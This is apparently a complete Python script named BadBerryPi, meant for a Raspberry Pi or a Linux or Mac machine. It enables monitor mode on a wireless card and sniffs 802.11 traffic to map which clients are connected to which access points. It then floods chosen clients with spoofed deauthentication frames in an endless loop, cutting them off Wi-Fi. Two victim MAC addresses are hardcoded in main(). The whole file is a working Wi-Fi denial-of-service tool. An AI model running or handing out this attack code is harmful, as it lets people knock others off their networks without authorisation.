#!/usr/bin/env python3

"""
This is a project started on the Raspberry Pi ZERO W
The purpose is to contact the specified client target around to connect to wifi
And it can also run on linux and mac
by S045pd
https://community.cisco.com/t5/wireless-mobility-documents/802-11-sniffer-capture-analysis-management-frames-and-open-auth/ta-p/3120622
"""
import argparse
import asyncio
import re
from contextlib import contextmanager
from dataclasses import dataclass, field
from itertools import chain
from platform import system
from typing import Tuple

import psutil
from scapy.all import *

from badberrypi.common import AP, STA, run_code
from badberrypi.log import *

__version__ = "1.0.0"


parser = argparse.ArgumentParser(description="BadBerryPi")
parser.add_argument(
    "-d", default="__all__", metavar="[mac-address]", help="default deny all"
)
parser.add_argument(
    "-a", default=None, metavar="[mac-address]", help="default allow yours"
)
# parser.add_argument('-f',default=,metavar='[mac-address]',help="default allow yours")
args = parser.parse_args()


@dataclass
class worker:

    wlan: str = None
    mon: str = None
    ap_addrs: dict = field(default_factory=dict)
    linking_events: dict = field(default_factory=dict)
    deny_addrs: set = field(default_factory=set)
    allow_addrs: set = field(default_factory=set)
    allow_yours: bool = True
    sniff_loop_counts: int = 20
    sendp_loop_counts: int = 10
    actions: dict = field(default=dict)

    def __post_init__(self) -> None:
        """
        Initialization and detection environment
        """

        def return_device(sys: str) -> Tuple[str, str]:
            """
            Get device default interface
            """
            return {
                "linux": ("phy0", "mon0"),
                "darwin": ("en0", "en0"),
            }.get(sys, ("", ""))

        self.system = system().lower()
        self.check_env()
        self.wlan, self.mon = return_device(self.system)

        if self.mon == None:
            end("no mon")

        if self.allow_yours:
            self.allow_addrs = self.allow_addrs.union(
                filter(
                    lambda _: re.match(r"([0-9a-z\:]{2}){5}[0-9a-z]", _),
                    chain(
                        *[
                            [item.address for item in groups]
                            for groups in psutil.net_if_addrs().values()
                        ]
                    ),
                )
            )

        self.deny_addrs = self.deny_addrs - self.allow_addrs

        info(f"devices: {self.wlan},{self.mon}")
        info(f"victim: {self.deny_addrs}")

    def check_env(self) -> bool:
        """
        Check whether the network card is available in monitoring mode
        """

        if self.system == "linux":
            if not re.search(b"\*\smonitor", run_code("sudo iw phy phy0 info")):
                end("system unsupport monitor")
            return True
        elif self.system == "darwin":
            return True
        return False

    @contextmanager
    def create_mon(self, close: bool = True):
        """
        Listen mode context manager
        http://ict.siit.tu.ac.th/help/iw
        """
        if self.system == "linux":
            get_info = lambda: run_code(f"sudo ifconfig {self.mon}")

            if not get_info():
                run_code(
                    f"sudo iw phy phy0 interface add {self.mon} type monitor;sudo iw dev {self.wlan} del;sudo ifconfig {self.mon} up"
                )
            if not re.search(b"<.*?UP.*?>", get_info()):
                end("monitor mode failed!")
            success("monitor mode started.")
            yield
            if close:
                run_code(
                    f"sudo iw dev {self.mon} del;sudo iw phy phy0 interface add {self.wlan} type managed;sudo ifconfig {self.wlan} up"
                )
        elif self.system == "darwin":
            run_code(
                f"sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z"
            )
            success("monitor mode ready for started.")
            yield

    async def sniffer(self):
        """
        Capture and analyze packets, pause for 0.5 seconds each time
        """
        success("start sniffing")
        while True:
            sniff(
                iface=self.mon,
                prn=self.extracter,
                count=self.sniff_loop_counts,
                monitor=True,
            )
            await asyncio.sleep(0.5)

    def extracter(self, pkt):
        """
        Classification and analysis according to the corresponding package type
        https://libtins.github.io/docs/latest/d8/df1/classTins_1_1Dot11.html
        Show all layers via {_ for _ in vars().keys() if 'Dot11' in _}
        {'Dot11EltERP', 'Dot11EltHTCapabilities', 'Dot11FCS', 'Dot11EltCountryConstraintTriplet', 'Dot11Ack', 'Dot11EltVendorSpecific', 'Dot11ReassoResp', 'Dot11EltDSSSet', 'Dot11CCMP', 'Dot11Disas', 'Dot11ReassoReq', 'Dot11WEP', 'Dot11PacketList', 'Dot11EltCountry', 'Dot11Beacon', 'Dot11ATIM', 'Dot11Auth', 'Dot11ProbeReq', 'Dot11', 'Dot11Encrypted', 'Dot11TKIP', 'Dot11EltRSN', 'Dot11EltRates', 'Dot11QoS', 'Dot11ProbeResp', 'Dot11EltMicrosoftWPA', 'Dot11AssoReq', 'Dot11AssoResp', 'Dot11Deauth', 'Dot11Elt'}
        """
        dst, src = pkt.getlayer(Dot11).addr1, pkt.getlayer(Dot11).addr2
        debug(dst, src, pkt, debug=False)
        if pkt.haslayer(Dot11Beacon):
            bssid = bytes.decode(pkt.getlayer(Dot11Elt).info)
            if src not in self.ap_addrs:
                detect(f"detect {src}[{bssid}]")
            self.ap_addrs[src] = bssid
        elif pkt.haslayer(Dot11QoS):
            if dst in self.ap_addrs:
                self.linking_events[src] = dst
                info(f"{src} --> {self.ap_addrs[dst]}")
        # elif pkt.haslayer(Dot11Auth):
        #     breakpoint()
        # elif pkt.haslayer(Dot11Deauth):
        #     breakpoint()
        # elif pkt.haslayer(Dot11WEP):
        #     print("wep")
        #     breakpoint()
        else:
            # breakpoint()
            debug(pkt)

    async def disassociat(self, sta: str, ap: str):
        """
        De-authenticate the target
        sendp
            :param x: the packets
            :param inter: time (in s) between two packets (default 0)
            :param loop: send packet indefinetly (default 0)
            :param count: number of packets to send (default None=1)
            :param verbose: verbose mode (default None=conf.verbose)
            :param realtime: check that a packet was sent before sending the next one
            :param return_packets: return the sent packets
            :param socket: the socket to use (default is conf.L3socket(kargs))
            :param iface: the interface to send the packets on
            :param monitor: (not on linux) send in monitor mode
            :returns: None
        """
        if not (sta and ap):
            return
        attack(f"disassociating [{sta}]")
        dot11 = Dot11(addr1=sta, addr2=ap, addr3=ap)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        sendp(packet, inter=0.1, count=1, iface=self.mon, verbose=1, monitor=True)
        await asyncio.sleep(0)

    async def kill_them_all(self):
        """
        De-authenticate all targets
        """
        success("start wireless disassociation")
        while True:
            await asyncio.gather(
                *[
                    self.disassociat(sta, self.linking_events[sta])
                    for sta in self.deny_addrs
                    if sta in self.linking_events
                ]
            )
            await asyncio.sleep(0.5)

    async def run(self):
        with self.create_mon(close=False):
            await asyncio.gather(self.kill_them_all(), self.sniffer())


def main():
    try:
        asyncio.run(worker(deny_addrs={"60:6d:3c:82:49:59", "24:f6:77:0f:e8:58"}).run())
    except PermissionError:
        end("use sudo!")
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
